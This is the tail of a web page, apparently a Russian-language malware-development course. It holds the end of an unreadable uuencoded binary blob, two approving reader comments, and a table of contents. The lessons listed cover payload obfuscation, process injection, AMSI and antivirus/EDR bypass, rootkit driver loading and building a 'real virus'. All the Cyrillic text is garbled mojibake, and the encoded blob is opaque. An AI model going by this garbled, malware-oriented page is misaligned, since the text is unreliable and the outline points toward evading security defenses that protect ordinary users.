M_L9UA?R;R=_(,,RM4&quot;064G(&gt;R&gt;&#039;=H3FPKDD&gt;9E3/\N=*.1#5`&gt;=RQ@$]%NDC
MIAR@G7V;C`/20%C&quot;@&lt;R!T(P#F6`XN\F?9(&quot;O#DGEW7JK5-^M-M.`9+&#039;@T?TY
M&amp;/7&#039;$+[!F_A30K@C-_8=V0=D&quot;%9K]`#E-G\K0MC+ODRTL&gt;IY*ALE5GU#`TLR
M`/3O-.9)C_@OB04/)=(\*0#X44A&amp;&quot;H!&lt;P?]%F/_`XJ&amp;L3&amp;T8*P&#039;^&lt;5+I^#V^
ML&lt;H;\!\&#039;86JJO%-0!]!;D-]AN9O2I9Z%VN&lt;GA``[5&gt;&amp;X]I$&gt;?-^S)T30]D)X
M%F$+6;3#,WRDL+&lt;1G9_M&amp;NB?E&gt;3/Q.IR&lt;2&gt;?K&quot;B&#039;+&gt;H1C&#039;0P(Y4=B+?,HQ&gt;W
M&gt;LG9Z[9.O`^*Y-^_4[HPPOCS/9&quot;BO#V\9VA.$LBIARLB,Y_8D9HQ^F$]`J&lt;4
M2XQ^]13&amp;&gt;J?),S&gt;1],!]8-M;&gt;LI])T(#6&lt;&#039;^&amp;^I]I_F&quot;_8L+3C,\YUE-O^.D
M!/RG[VO%&#039;`&#039;_:=&amp;MNC/@/RU0MP3\IU_P0E%ZP&#039;^&quot;!OM&gt;F[ZIX)O*0&amp;8/]11?
ML&quot;U5@&#039;($^J?[-XL&quot;*RM1)C5EM)H,6;T&#039;D$`VI5$/4!OG6]&gt;0&gt;F0/M;Q94?XP
MG1G^%Z9W4-VQV@DG&quot;25XYT,B=AK-HUM%246Y$K&lt;SQ==&quot;::A,O:4Q+F9*&quot;$^&#039;
M,P9N?UZM202N0&amp;2A=&gt;$+8`OBZ8C@*&gt;\YC2B&gt;#\@;X+H5E.WYG#L%`,?+-T\!
MD.L.1ZVX:D8:2[LKP2HHD&lt;:DNR.&amp;?GB?6/\FVZD$&quot;N2VJ5))2L!_2I&#039;)S0KM
M?#U7P&#039;^@ST2Z:V(M,[*_[#.TI?8&gt;CEG41N]&quot;\2=P.X[:0OA;R?-^`?N567YP
MP&#039;[.VXYFA3O*`^ZI&amp;`&#039;ZS?C\*7=6TJZKS!.27UZ@6$A^-RMDA.57R5]?8O(Y
MH$8IDZE#7;%X[^G1^PV//-4=50W;+W&gt;^93@+EBW=69:%+%=66[HB)]NP;O*P
M35ZI;J?#]&amp;C]IF!+8?14=T!&gt;7?(&lt;?E74PO-&#039;V&gt;&#039;YE?NH-Y;H_.F&gt;W&#039;FB\\NN
MA\+/+XLR41^P!11V!.LWHO(S,XNR%#J#\@N;C!R3/])C\E/&quot;2&amp;+RT]])L/GH
MWC&#039;YM8/47#&#039;YF:L&gt;-TG=?YKF&quot;[@O4&quot;6Y^4DHZ&quot;&lt;HRA%M/U^(_?\0S?V^*KH&quot;
MT.,IZB[%Q*VHHV+B5-/-8/L/&quot;;3_3?1TET3/BICOI+4G7JLM&lt;?&#039;UYE^9ETLL
M%P!2@NP_RM).SRA5&#039;-35GZG.X-]V8?&gt;HSH6BK23.R&gt;X7*!]/9T@CZ8&#039;Q-2V9
M31(%&amp;O!2SUB]E1CWN.8.$CELUY4=JK%5_7U8_&#039;KI=*PBUM;,(/2L,#6(EA5&#039;
M&#039;&amp;&amp;JLAAX!])KU1HLD2B\YJ[V4FS[?#&#039;HW/&#039;?GB[^&gt;[7*XK^7MTI;Q1+&amp;?R]6
M%O&#039;?GN+)CO_^ASW^^Q^+^._B&quot;V]]8,:#=Z`I;SQXTG(I(T#\&#039;_8`\?RU(T`\
M:;B&lt;)V+\&#039;UZ.B/&amp;.03Y3Q/@)$&lt;F&lt;*JQQY!5PL^+(_[&amp;(([^((__7?;3U&#039;UQ.
MXT&lt;,_8Y/QOI?+&amp;UB_-=JK;JUN56$^*];E6)UL?X_Q9,K_KL6_AV)A`4]CV&lt;7
MPHEV&gt;3HDKXVWHS&amp;^_RMST??[6/F?S-=CRH!,_J^5$_ZO5$&#039;_+RWR/SS-&lt;V_^
M[U&amp;F-K@=XY-:I0#[\MPC7CSRX^1_G*W&#039;D0)9_%_9POPO1`&quot;4JY4BY&#039;\KE&lt;N+
M^.]/\CR(_WM()%Z3E(B#Z3)+&#039;?&#039;NG7`4\TI;*XY/O6[[_YYUNNV6=QK-`KG4
MP&lt;EOS5[W[/&quot;T&lt;P!!(&#039;&gt;[C&gt;Y[;^D`XLB?8CB28/#B;SP9Q78KN)A=O6;_66(2
MR4CZHH.,R0T6PBB3_RF&gt;&#039;MA&#039;!O^7-LLUSO^U4K4$^O]F=6&#039;_&gt;Y+G!Y[&gt;X6_Q
M=!&quot;.-ZY?%Y)7MS1E#[PL[!X=[4/*AE[GL&#039;/J_&gt;+M-?9/VCN%`B92^+US&quot;*D8
M@+]X1@&gt;6@6&amp;@9V&quot;(E`P,D&lt;C`\&quot;\\I+CTEFD![Y=?+%D,,&amp;&lt;&quot;&gt;20X3KMG!(RO
M!0(V9G#H&#039;?0:!ZU:M?##)/*O;GP,*1:,ILLT_=2:M_1SY[&quot;Y?]9J;Z,\F,7!
M@(B-[-*3GCP\I&lt;HHGO;BX&amp;H9&#039;&#039;IM[Y&lt;VFMW3%^_V&amp;XT&amp;J==^=]KN&#039;O::M(!G
M25_AJ7V14&lt;H_=VP]CR&gt;D8YJ,(4%$YUV]E@&lt;/\R&amp;BY\0$GL2;B!&quot;O&#039;7AX``:2
M&#039;B4$%,+1%&quot;7\,OSA1U?]-:]_3;C\)?G[\X=S1FR3B&#039;R^7%YZB6V#=^VV]^/@
MXVAI3=#7&quot;J8&lt;F&lt;RF,2NVI+Y!(&lt;G&gt;L:L`12#&amp;Y^;J_(]3_C-]_3$TP&quot;S];[-4
M$?H?60%`_]NL+NP_3_+DT_\2Y:S]#G0R2-G5V]MOO#E)4H;I7[YZ/[?&gt;&#039;S8.
M.LW=QDE[^_&quot;(L+Q+CV3$]GUIDASH[UJ7S.3_1]``,_6_2DGP_U:-VG^*&quot;_O/
MDSP+_6^A_RWTO_OJ?Z/Q]ZX&quot;6N4_GM@\W@E`MOV_RNW_6\4MS/],5H.%_&#039;^*
MY_[V/WZLMS@!^)Z?%/Y_LOU?M2CM_ZC]?[-:7O#_4SP/Y/_O[01`!OJ[WK&lt;]
MUI/)_]]^_T&lt;V@.+\;[-4VJ+[O]*&quot;_Y_BL&gt;S_\JK/B0[\5S2,_H&lt;\*?S_:!;@
M;/MO&lt;OY?0OM/N434@`7_/\&#039;S_/9?NB1_=Q9@%&gt;SO5I?(P?\/U@!R^O_A^E^L
MXOV?:KFVX/^G&gt;+[1^O_]&amp;\86S^)9/(MG\2R&gt;Q;-X%L_B63R+9_$LGK_0\_\!
(!&quot;VB[@!8`@``
`
end

|=[ EOF ]=---------------------------------------------------------------=|</code></pre>
	</div>
</div></div>
						
					

					
						

	
		
	

					
					
										

					

					
						
					

					

					

					<div class="reactionsBar js-reactionsList is-active">
						
	
	
		<ul class="reactionSummary">
		
			<li><span class="reaction reaction--small reaction--1" data-reaction-id="1"><i aria-hidden="true"></i><img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f44d.png" loading="lazy" width="64" height="64" class="reaction-image reaction-image--emoji js-reaction" alt="Like" title="Like" /></span></li>
		
		</ul>
	


<span class="u-srOnly">–†–µ–∞–∫—Ü–∏–∏:</span>
<a class="reactionsBar-link" href="reactions.html" data-xf-click="overlay" data-cache="false" rel="nofollow"><bdi>GoGaBoHGa</bdi>, <bdi>Tuong</bdi>, <bdi>Marat</bdi> –∏ –µ—â—ë 1 —á–µ–ª–æ–≤–µ–∫</a>
					</div>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</article>
			</div>
		</div>
	</div>
	
	
</div>
















	<div class="columnContainer"
		data-xf-init="lightbox"
		data-lb-id="article-6"
		data-lb-universal="0">

		<span class="u-anchorTarget" id="comments"></span>

		<div class="columnContainer-comments">
			
	
	

	<div class="block block--messages"
		data-xf-init=""
		data-type="ams_comment"
		data-href="/inline-mod/">

		
	
	


		<div class="block-outer"></div>
		
		<div class="block-container"
			data-xf-init="select-to-quote"
			data-message-selector=".js-comment">
			
			<h3 class="block-header">–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏</h3>
			<div class="block-body js-replyNewCommentContainer">
				
					<span class="u-anchorTarget" id="comments"></span>
					
						
							
	
	

	<article class="message message--simple message--comment js-comment js-inlineModContainer"
		data-author="vivty"
		data-content="ams-comment-25"
		id="js-comment-25">

		<span class="u-anchorTarget" id="ams-comment-25"></span>

		<div class="message-inner">
			<div class="message-cell message-cell--user">
				
	<header class="message-user"
		
		itemscope itemtype="https://schema.org/Person"
		itemid="https://osint42.org/members/vivty.94/">

		
			<meta itemprop="name" content="vivty" />
			
				<meta itemprop="url" content="https://osint42.org/members/vivty.94/" />
			
		

		<div class="message-avatar">
			<div class="message-avatar-wrapper">
				<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--s avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
		</a>
			</div>
		</div>
		<span class="message-userArrow"></span>
	</header>

			</div>
			<div class="message-cell message-cell--main">
				<div class="js-quickEditTarget">
					<div class="message-content js-messageContent">
						<header class="message-attribution message-attribution--plain">
							<ul class="listInline listInline--bullet">
								<li class="message-attribution-user">
									<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--xxs avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
		</a>
									<h4 class="attribution"><a href="https://osint42.org/members/vivty.94/" class="username " dir="auto" data-user-id="94" data-xf-init="member-tooltip"><span class="username--style2">vivty</span></a></h4>
								</li>
								<li>
									<a href="../comments/25/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-12T18:12:34+0300" data-timestamp="1749741154" data-date="12.06.2025" data-time="18:12" data-short="12 –ò—é–Ω" title="12.06.2025 –≤ 18:12">12.06.2025</time></a>
								</li>
							</ul>
						</header>

						
						
						

						<div class="message-userContent lbContainer js-lbContainer"
							data-lb-id="ams-comment-25"
							data-lb-caption-desc="vivty &middot; 12.06.2025 –≤ 18:12">

							<article class="message-body js-selectToQuote">
								<div class="bbWrapper">–û—Ç–ª–∏—á–Ω—ã–µ —Å—Ç–∞—Ç—å–∏.<br />
–°–ø–∞—Å–∏–±–æ!</div>
								<div class="js-selectToQuoteEnd">&nbsp;</div>
							</article>

							
						</div>

						

						
							
	

						
					</div>

					<footer class="message-footer">
						

						<div class="reactionsBar js-reactionsList ">
							
						</div>
					</footer>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</div>
			</div>
		</div>
	</article>

						
					
						
							
	
	

	<article class="message message--simple message--comment js-comment js-inlineModContainer"
		data-author="HMCoba"
		data-content="ams-comment-27"
		id="js-comment-27">

		<span class="u-anchorTarget" id="ams-comment-27"></span>

		<div class="message-inner">
			<div class="message-cell message-cell--user">
				
	<header class="message-user"
		
		itemscope itemtype="https://schema.org/Person"
		itemid="https://osint42.org/members/hmcoba.102/">

		
			<meta itemprop="name" content="HMCoba" />
			
				<meta itemprop="url" content="https://osint42.org/members/hmcoba.102/" />
			
		

		<div class="message-avatar">
			<div class="message-avatar-wrapper">
				<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--s" data-user-id="102" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1026af6.jpg?1756734897" srcset="/data/avatars/m/0/102.jpg?1756734897 2x" alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" itemprop="image" /> 
		</a>
			</div>
		</div>
		<span class="message-userArrow"></span>
	</header>

			</div>
			<div class="message-cell message-cell--main">
				<div class="js-quickEditTarget">
					<div class="message-content js-messageContent">
						<header class="message-attribution message-attribution--plain">
							<ul class="listInline listInline--bullet">
								<li class="message-attribution-user">
									<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--xxs" data-user-id="102" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1026af6.jpg?1756734897"  alt="HMCoba" class="avatar-u102-s" width="48" height="48" loading="lazy" /> 
		</a>
									<h4 class="attribution"><a href="https://osint42.org/members/hmcoba.102/" class="username " dir="auto" data-user-id="102" data-xf-init="member-tooltip"><span class="username--style2">HMCoba</span></a></h4>
								</li>
								<li>
									<a href="../comments/27/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-16T14:27:08+0300" data-timestamp="1750073228" data-date="16.06.2025" data-time="14:27" data-short="16 –ò—é–Ω" title="16.06.2025 –≤ 14:27">16.06.2025</time></a>
								</li>
							</ul>
						</header>

						
						
						

						<div class="message-userContent lbContainer js-lbContainer"
							data-lb-id="ams-comment-27"
							data-lb-caption-desc="HMCoba &middot; 16.06.2025 –≤ 14:27">

							<article class="message-body js-selectToQuote">
								<div class="bbWrapper">–û—Ç–ª–∏—á–Ω—ã–π –∑–∞—Ö–æ–¥ –≤ —Ç–µ–º—É Red Team. <br />
–¢–∞–∫–∏–µ —Å—Ç–∞—Ç—å–∏ –≤–∞–∂–Ω—ã –¥–ª—è –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è –∞—Ç–∞–∫—É—é—â–∏—Ö —Ç–µ—Ö–Ω–∏–∫. <br />
–ê–∫—Ü–µ–Ω—Ç –Ω–∞ MDLC –∏ —Ä–µ–∞–ª—å–Ω–æ–µ –ø—Ä–∏–º–µ–Ω–µ–Ω–∏–µ - —Ç–æ, —á–µ–≥–æ —á–∞—Å—Ç–æ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç. <br />
–ë—É–¥—É —Å–ª–µ–¥–∏—Ç—å –∑–∞ —Å–µ—Ä–∏–µ–π.</div>
								<div class="js-selectToQuoteEnd">&nbsp;</div>
							</article>

							
						</div>

						

						
							
	
		
			<aside class="message-signature">
			
				<div class="bbWrapper">HMCoba</div>
			
			</aside>
		
	

						
					</div>

					<footer class="message-footer">
						

						<div class="reactionsBar js-reactionsList is-active">
							
	
	
		<ul class="reactionSummary">
		
			<li><span class="reaction reaction--small reaction--1" data-reaction-id="1"><i aria-hidden="true"></i><img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f44d.png" loading="lazy" width="64" height="64" class="reaction-image reaction-image--emoji js-reaction" alt="Like" title="Like" /></span></li>
		
		</ul>
	


<span class="u-srOnly">–†–µ–∞–∫—Ü–∏–∏:</span>
<a class="reactionsBar-link" href="../comments/27/reactions.html" data-xf-click="overlay" data-cache="false" rel="nofollow"><bdi>Marat</bdi></a>
						</div>
					</footer>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</div>
			</div>
		</div>
	</article>

						
					
				
			</div>
		</div>

		<div class="block-outer block-outer--after">
			
			
		</div>

		
	
	

	</div>

	
	
	

	


		</div>
	</div>	



	



		











	



	



	




	
</div>
					
				</div>

				
					<div class="p-body-sidebar">
						
						
							<div class="block">
			<div class="block-container">
				<h3 class="block-header">–û–ì–õ–ê–í–õ–ï–ù–ò–ï</h3>
				<div class="block-body">
					<a class="blockLink " href="index.html">
						
							–ó–∞—á–µ–º –∏–∑—É—á–∞—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º ?
						
					</a>

					
						<a href="page/instrumenty.1/index.html" class="blockLink">
							 –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã</a>
					
						<a href="page/tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="blockLink">
							 –¢–∞–∫ –∫–∞–∫–æ–π-–∂–µ —è–∑—ã–∫ –≤—ã–±—Ä–∞—Ç—å !?</a>
					
						<a href="page/shpargalka-po-arkhitekture-vindy.3/index.html" class="blockLink">
							 –®–ø–∞—Ä–≥–∞–ª–∫–∞ –ø–æ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–µ –≤–∏–Ω–¥—ã</a>
					
						<a href="page/chto-takoye-payload-i-shell-code.5/index.html" class="blockLink">
							 –ß—Ç–æ —Ç–∞–∫–æ–µ payload –∏ shell code</a>
					
						<a href="page/izuchayem-dinamicheskiye-biblioteki.6/index.html" class="blockLink">
							 –ò–∑—É—á–∞–µ–º –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏</a>
					
						<a href="page/protsessy-windows.7/index.html" class="blockLink">
							 –ü—Ä–æ—Ü–µ—Å—Å—ã Windows</a>
					
						<a href="page/vidy-detektov.8/index.html" class="blockLink">
							 –í–∏–¥—ã –¥–µ—Ç–µ–∫—Ç–æ–≤</a>
					
						<a href="page/kuda-klast-nagruzku.9/index.html" class="blockLink">
							 –ö—É–¥–∞ –∫–ª–∞—Å—Ç—å –Ω–∞–≥—Ä—É–∑–∫—É ?</a>
					
						<a href="page/shifruyem-payload.10/index.html" class="blockLink">
							 –®–∏—Ñ—Ä—É–µ–º Payload</a>
					
						<a href="page/obfuskatsiya-payload.11/index.html" class="blockLink">
							 –û–±—Ñ—É—Å–∫–∞—Ü–∏—è Payload</a>
					
						<a href="page/lokal-nyi-zapusk-payload.12/index.html" class="blockLink">
							 –õ–æ–∫–∞–ª—å–Ω—ã–π –∑–∞–ø—É—Å–∫ Payload</a>
					
						<a href="page/in-yektsiya-v-protsess.13/index.html" class="blockLink">
							 –ò–Ω—å–µ–∫—Ü–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å</a>
					
						<a href="page/in-yektsiya-shell-koda-v-protsess.14/index.html" class="blockLink">
							 –ò–Ω—ä–µ–∫—Ü–∏—è —à–µ–ª–ª-–∫–æ–¥–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å</a>
					
						<a href="page/razmeshchayem-payload-udalenno-na-servere.15/index.html" class="blockLink">
							 –†–∞–∑–º–µ—â–∞–µ–º Payload —É–¥–∞–ª–µ–Ω–Ω–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ</a>
					
						<a href="page/pryachem-payload-v-reyestre.16/index.html" class="blockLink">
							 –ü—Ä—è—á–µ–º Payload –≤ —Ä–µ–µ—Å—Ç—Ä–µ</a>
					
						<a href="page/razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="blockLink">
							 –†–∞–∑–±–æ—Ä–∫–∞ —Å —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–¥–ø–∏—Å—å—é –∑–≤–µ—Ä—å–∫–∞</a>
					
						<a href="page/izuchayem-tekhniku-thread-hijacking.18/index.html" class="blockLink">
							 –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Thread Hijacking</a>
					
						<a href="page/opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="blockLink">
							 –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ PID –Ω—É–∂–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∏–ª–∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</a>
					
						<a href="page/izuchayem-tekhniku-apc-injection.20/index.html" class="blockLink">
							 –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É APC Injection</a>
					
						<a href="page/vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="blockLink">
							 –í—ã–∑–æ–≤ –∫–æ–¥–∞ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</a>
					
						<a href="page/in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="blockLink">
							 –ò–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏</a>
					
						<a href="page/izuchayem-tekhniku-stomping-injection.23/index.html" class="blockLink">
							 –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Stomping Injection</a>
					
						<a href="page/kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="blockLink">
							 –ö–æ–Ω—Ç—Ä–æ–ª—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</a>
					
						<a href="page/izuchayem-tekhniku-spoofing.25/index.html" class="blockLink">
							 –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Spoofing</a>
					
						<a href="page/skrytiye-strok.26/index.html" class="blockLink">
							 –°–∫—Ä—ã—Ç–∏–µ —Å—Ç—Ä–æ–∫</a>
					
						<a href="page/izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="blockLink">
							 –ò–∑—É—á–∞–µ–º –∫—É–Ω–≥—Ñ—É-1. –°–∫—Ä—ã—Ç–∏–µ —Ç–∞–±–ª–∏—Ü—ã –∏–º–ø–æ—Ä—Ç–∞</a>
					
						<a href="page/kungfu-2-izuchayem-api-hooking.28/index.html" class="blockLink">
							 –ö—É–Ω–≥—Ñ—É-2.–ò–∑—É—á–∞–µ–º API Hooking</a>
					
						<a href="page/predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="blockLink">
							 –ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞. –†–∞–∑–±–æ—Ä–∫–∞ —Å —Å–∏—Å–∫–æ–ª–∞–º–∏</a>
					
						<a href="page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html" class="blockLink">
							 –ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞-2. –ü—Ä–∞–∫—Ç–∏–∫–∞. –†–µ–∞–ª–∏–∑—É–µ–º —Ç–µ—Ö–Ω–∏–∫–∏ –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ —Å–∏—Å–∫–æ–ª—ã</a>
					
						<a href="page/cherpayem-sily-v-antiotladke.31/index.html" class="blockLink">
							 –ß–µ—Ä–ø–∞–µ–º —Å–∏–ª—ã –≤ –∞–Ω—Ç–∏–æ—Ç–ª–∞–¥–∫–µ</a>
					
						<a href="page/obkhod-virtual-nykh-mashin.32/index.html" class="blockLink">
							 –û–±—Ö–æ–¥ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω</a>
					
						<a href="page/otkryvayem-vrata-ada.33/index.html" class="blockLink">
							 –û—Ç–∫—Ä—ã–≤–∞–µ–º –≤—Ä–∞—Ç–∞ –∞–¥–∞</a>
					
						<a href="page/umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="blockLink">
							 –£–º–µ–Ω—å—à–µ–Ω–∏–µ –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –¥–µ—Ç–µ–∫—Ç–∞ –∑–≤–µ—Ä—å–∫–∞</a>
					
						<a href="page/obkhod-windows-defender.35/index.html" class="blockLink">
							 –û–±—Ö–æ–¥ Windows defender</a>
					
						<a href="page/pro-endpoint-detection-and-response-edr.36/index.html" class="blockLink">
							 –ü—Ä–æ Endpoint Detection and Response (EDR)</a>
					
						<a href="page/pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="blockLink">
							 –ü—Ä–æ –¥–µ—Ç–µ–∫—Ç –≤ –ø–∞–º—è—Ç–∏. –ù–∏—á–µ–≥–æ –Ω–µ –ø–æ–¥–µ–ª–∞–µ—à—å –∏ —ç—Ç–æ –Ω–µ–∏–∑–±–µ–∂–Ω–æ)</a>
					
						<a href="page/ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="blockLink">
							 –û–≥—Ä–æ–º–Ω–∞—è –±–∞–∑–∞ –∏—Å—Ö–æ–¥–Ω–∏–∫–æ–≤ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤–∏—Ä—É—Å–æ–≤ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º</a>
					
						<a href="page/kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="blockLink">
							 –ö–∞–∫ RootKit –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–ª–∏ –∂–µ –∫–∞–∫ –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥—Ä–∞–π–≤–µ—Ä –±–µ–∑ –ø–æ–¥–ø–∏—Å–∏</a>
					
						<a href="page/obkhod-amsi.40/index.html" class="blockLink">
							 –û–±—Ö–æ–¥ AMSI</a>
					
						<a href="page/obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="blockLink">
							 –û–±—Ö–æ–¥ AMSI –ø—Ä–∏ –ø–æ–º–æ—â–∏ —Ö–∞—Ä–¥–≤–∞—Ä–Ω—ã—Ö —Ç–æ—á–µ–∫ –æ—Å—Ç–∞–Ω–æ–≤–∞</a>
					
						<a href="page/uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="blockLink">
							 –£–∫–ª–æ–Ω—è–µ–º—Å—è –æ—Ç –ø–æ–≤–µ–¥–µ–Ω—á–µ—Å–∫–æ–≥–æ –¥–µ—Ç–µ–∫—Ç–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞ –∏ EDR</a>
					
						<a href="page/obkhodim-antivirusy-i-edr.43/index.html" class="blockLink">
							 –û–±—Ö–æ–¥–∏–º –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã –∏ EDR</a>
					
						<a href="page/mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="blockLink">
							 MutationGate - –ù–æ–≤—ã–π –ø–æ–¥—Ö–æ–¥ —Ä–∞–±–æ—Ç—ã —Å —Å–∏—Å–∫–æ–ª–∞–º–∏</a>
					
						<a href="page/razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="blockLink">
							 –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞—Å—Ç–æ—è—â–µ–≥–æ –≤–∏—Ä—É—Å–∞ –≤ 2024 –≥–æ–¥—É</a>
					

					
						<a href="index9401.html?full=1" class="blockLink is-selected">–ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤—Å—é —Å—Ç–∞—Ç—å—é</a>
					
				</div>
			</div>
		</div>
						
							<div class="block">
		<div class="block-container">
			<h3 class="block-minorHeader">–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å—Ç–∞—Ç—å–µ</h3>
			<div class="block-body block-row block-row--minor">
				<dl class="pairs pairs--justified">
					<dt>–ê–≤—Ç–æ—Ä</dt>
					
						<dd><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></dd>
					
				</dl>
				
					<dl class="pairs pairs--justified">
						<dt>Article read time</dt>
						<dd>398 min read</dd>
					</dl>
				
				
					<dl class="pairs pairs--justified">
						<dt>–ü—Ä–æ—Å–º–æ—Ç—Ä—ã</dt>
						<dd>9 577</dd>
					</dl>
				
				
					<dl class="pairs pairs--justified">
						<dt>–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏</dt>
						<dd>2</dd>
					</dl>
				
				
				
					<dl class="pairs pairs--justified">
						<dt>–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ</dt>
						<dd><time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 –ú–∞–π" title="09.05.2025 –≤ 16:44">09.05.2025</time></dd>
					</dl>
				
				
				

				
			</div>
		</div>
	</div>
						
							<div class="block">
			<div class="block-container">
				<h3 class="block-minorHeader"><a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html">–ë–æ–ª—å—à–µ –≤ –£—Ä–æ–∫–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Å–æ—Ñ—Ç–∞</a></h3>
				<div class="block-body block-row">
					<ul class="articleSidebarList">
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../obkhod-antivirusov-cherez-uyazvimyi-draiver.71/index.html">–û–±—Ö–æ–¥ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤ —á–µ—Ä–µ–∑ —É—è–∑–≤–∏–º—ã–π –¥—Ä–∞–π–≤–µ—Ä</a>

			
			
			<div class="contentRow-snippet">
